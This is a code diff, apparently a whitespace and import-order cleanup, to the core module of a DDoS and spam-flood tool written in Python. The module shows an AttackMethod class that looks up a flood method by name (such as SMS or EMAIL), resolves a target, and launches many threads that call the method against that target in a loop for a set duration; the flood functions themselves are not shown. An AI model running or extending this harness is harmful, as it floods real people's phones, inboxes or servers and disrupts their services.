@@ -1,11 +1,13 @@
-from time import time, sleep
 from threading import Thread
+from time import time, sleep
+
 from colorama import Fore
 from humanfriendly import format_timespan, Spinner
 from tools.crash import CriticalError
 from tools.ipTools import GetTargetAddress, InternetConnectionCheck
 
 """ Find & import ddos method """
+
 
 def GetMethodByName(method):
     if method == "SMS":
@@ -29,7 +31,9 @@ def GetMethodByName(method):
             f"Method 'flood' not found in {repr(dir)}. Please use python 3", "-"
         )
 
+
 """ Class to control attack methods """
+
 
 class AttackMethod:
     # Constructor
@@ -41,15 +45,18 @@ class AttackMethod:
         self.target = target
         self.threads = []
         self.is_running = False
+
     # Enter
     def __enter__(self):
         InternetConnectionCheck()
         self.method = GetMethodByName(self.name)
         self.target = GetTargetAddress(self.target_name, self.name)
         return self
+
     # Exit
     def __exit__(self, exc_type, exc_val, exc_tb):
         print(f"{Fore.MAGENTA}[!] {Fore.BLUE}Attack completed!{Fore.RESET}")
+
     # Run time checker
     def __RunTimer(self):
         __stopTime = time() + self.duration
@@ -58,10 +65,12 @@ class AttackMethod:
                 return
             sleep(1)
         self.is_running = False
+
     # Run flooder
     def __RunFlood(self):
         while self.is_running:
             self.method(self.target)
+
     # Start threads
     def __RunThreads(self):
         # Run timer thread
@@ -76,8 +85,8 @@ class AttackMethod:
             self.threads.append(thread)
         # Start flood threads
         with Spinner(
-            label=f"{Fore.YELLOW}Starting {self.threads_count} threads{Fore.RESET}",
-            total=100,
+                label=f"{Fore.YELLOW}Starting {self.threads_count} threads{Fore.RESET}",
+                total=100,
         ) as spinner:
             for index, thread in enumerate(self.threads):
                 thread.start()
@@ -88,6 +97,7 @@ class AttackMethod:
             print(
                 f"{Fore.GREEN}[+] {Fore.YELLOW}Stopped thread {index + 1}.{Fore.RESET}"
             )
+
     # Start ddos attack
     def Start(self):
         if self.name == "EMAIL":
